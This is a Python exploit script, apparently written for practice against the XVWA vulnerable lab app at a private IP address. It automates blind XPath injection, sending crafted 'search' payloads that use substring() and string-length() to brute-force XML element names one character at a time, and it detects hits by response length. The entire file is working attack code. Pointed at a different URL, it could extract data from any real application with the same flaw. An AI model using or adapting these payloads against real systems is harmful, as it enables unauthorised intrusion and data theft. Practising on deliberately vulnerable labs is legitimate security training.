#!/usr/bin/python3

from pwn import *
import signal
import sys
import requests
import time
import string
import pdb

# function to manage CTRL+c
def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

# function to a brute force to find the name of a XML label
def xpath_name_cracker(label_index, label_name_size):
    # acumulator
    label_name = ""
    # iterate label's name size
    for index in range(1, label_name_size + 1):
        for character in characters:
            post_data = {"search": "1' and substring(name(/*[1]/*[%d]),%d,1)='%c" % (label_index, index, character), "submit": ""}
            r = requests.post(main_url, headers=headers, data=post_data)
            # invalid characters
            if len(r.text) not in undesired_responses:
                label_name += character
                break
    return label_name

# function to a brute force to find the name of a XML label
def xpath_name_size_cracker(label_index):
    for i in range(1, 20):
        post_data = {"search": "1' and string-length(name(/*[1]/*[%d]))='%d" % (label_index, i), "submit": ""}
        r = requests.post(main_url, headers=headers, data=post_data)
        # invalid characters
        if len(r.text) not in undesired_responses:
            return i

# function to obtain all names of labels
def xpath_cracker():
    p1 = log.progress("Brute force")
    p1.status("Starting brute force process")

    time.sleep(2)
    
    p2 = log.progress("Label names")

    # acumulator
    label_names = []
    # iterate label's name size
    for i in range(1, 11):
        label_size = xpath_name_size_cracker(i)
        label_name = xpath_name_cracker(i, label_size)
        label_names.append(label_name)
        p2.status(label_names)

    p1.success("Brute force process finished")
    p2.success(label_names)

# CTRL+c
signal.signal(signal.SIGINT, def_handler)

# global variables
main_url = "http://192.168.200.135/xvwa/vulnerabilities/xpath/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
characters = string.ascii_letters
undesired_responses = [i for i in range(8680, 8691)]

if __name__ == "__main__":
    xpath_cracker()

